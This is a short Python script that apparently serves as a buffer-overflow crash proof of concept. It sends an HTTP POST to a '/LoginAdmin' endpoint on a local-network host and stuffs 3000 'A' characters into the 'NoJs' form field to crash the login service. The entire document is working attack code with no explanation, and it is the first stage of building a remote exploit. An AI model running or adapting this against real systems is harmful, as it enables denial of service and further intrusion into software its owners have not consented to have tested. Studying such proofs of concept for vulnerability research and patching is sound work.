import socket, os, sys
from struct import pack

crash = "A" * 3000

buffer = ""
buffer += "POST /LoginAdmin HTTP/1.1\r\n"
buffer += "Host: 192.168.61.145:18881\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Accept-Encoding: gzip, deflate\r\n"
buffer += "Referer: http://192.168.61.145:18881/\r\n"
buffer += "Connection: close\r\n"
buffer += "Upgrade-Insecure-Requests: 1\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: 78\r\n\r\n"
buffer += "Password=asdf&Redirect=%23%23%23REDIRECT%23%23%23&NoJs=" + crash + "&LoginButtonName=Login\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.61.145', 18881))
s.send(buffer)
s.close()
